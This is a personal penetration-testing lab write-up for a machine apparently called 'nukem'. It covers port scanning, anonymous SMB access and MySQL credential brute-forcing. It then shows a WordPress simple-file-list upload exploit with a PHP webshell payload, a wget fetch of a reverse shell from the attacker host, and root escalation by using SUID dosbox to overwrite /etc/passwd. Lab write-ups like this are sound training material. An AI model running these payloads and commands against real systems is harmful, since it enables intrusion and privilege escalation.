### Enumeration
```
IP=192.168.247.105
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,3306,5000,13000,36445 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.3 (protocol 2.0)
- 80
	- Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
- 3306
	- mysql
- 5000
	- Werkzeug httpd 1.0.1 (Python 3.8.5)
- 13000
	- nginx 1.18.0
- 36445
	- Samba smbd 4.6.2
	- Samba 4.12.6
### Foothold
- 36445
	- smbclient -N -L //$IP -p36445
		- anonymous login success
		- share
			- Commander
				- ![[Pasted image 20240712154944.png]]
				- downloaded files
				- chinook.db
					- employees tab, has emails, names
					- Seems like a music database
				- sever.py
					- flask api, sql connector
					- grabs items from the db
			- IPC$  -  Samba 4.12.6
	- nmap --script smb-vuln* -p135,139,445 $IP
- 3306
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
		- ERROR] Host '192.168.45.195' is not allowed to connect to this MariaDB server
- 80
	- Default landing page
		- ![[Pasted image 20240712155107.png]]
	- Versions
		- `News Vibrant 1.0.12 | Theme: news-vibrant by [CodeVibrant](http://codevibrant.com/).`
		- WP 5.5.1
			- no found exploits
			- sudo wpscan --url http://192.168.247.105 --enumerate --api-token API
				- http://192.168.247.105/wp-content/uploads/
				- WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
				- sqli
				- WordPress < 6.4.3 - Admin+ PHP File Upload
				- plug ins
					- simple-file-list 4.2.2
						- Unauthenticated Arbitrary File Upload RCE
						- exploit-db 48979
						- Put php webshell in payload `<?php system($_GET['cmd']); ?>`
						- python 48979.py http://192.168.247.105
						- ![[Pasted image 20240712161741.png]]
						- `http://192.168.247.105/wp-content/uploads/simple-file-list/3705.php?cmd=wget%20http://192.168.45.195:80/php-reverse-shell.php`
						- Upload php reverse shell
							- ![[Pasted image 20240712162441.png]]
						- `192.168.247.105/wp-content/uploads/simple-file-list/php-reverse-shell.php.1`
						- launched the php rev shell
						- ![[Pasted image 20240712162553.png]]
					- tutor 1.5.3
						- sqli
						- Authenticated Local File Inclusion
				- users
					- admin
	- Created new account
		- In top right corner the manage account brings us to http://192.168.247.105/wp-admin/profile.php
		- Then we can click wp icon top left
			- WP 5.5.1
	- Directory Brute force
		- dirsearch -u http://$IP
			- `/wp-admin  /wp-content  /wordpress  /readme.html  /license.txt  /wp-content/plugins/akismet/akismet.php`
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 5000
	- Default landing page
		- ![[Pasted image 20240712155212.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 13000
	- Default landing page
		- ![[Pasted image 20240712155220.png]]
		- Login: http://192.168.247.105:13000/?username=admin%27&pass=amdin
			- Put into url header
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- `/js  /css  /fonts  /images`
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
### PE
#### Linux
- http
	- id
		- uid=33(http) gid=33(http) groups=33(http)
	- sudo -l
		- needs password
	- uname -a
		- `Linux nukem 5.8.9-arch2-1 #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000 x86_64 GNU/Linux`
	- getcap -r / 2>/dev/null
		- ![[Pasted image 20240712162715.png]]
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- ![[Pasted image 20240712162722.png]]
			- Ran through VScode script  -  dosbox
				- /usr/bin/dosbox
				- `LFILE='\etc\passwd'
				- `DATA='root:x:0:0:root:/root:/bin/bash'
				- `/usr/bin/dosbox -c 'mount c /' -c "echo $DATA >c:$LFILE" -c exit
				- Adding to /etc/passwd does not work for root. Maybe we can as another user then do sudoers
					- same error for commander user
			- GTFObins
				- Allows files overwrite
				- `LFILE='\path\to\file_to_write'
				- `./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
	- Users with console
		- commander
	- linpeas
### Credentials
### Lessons Learned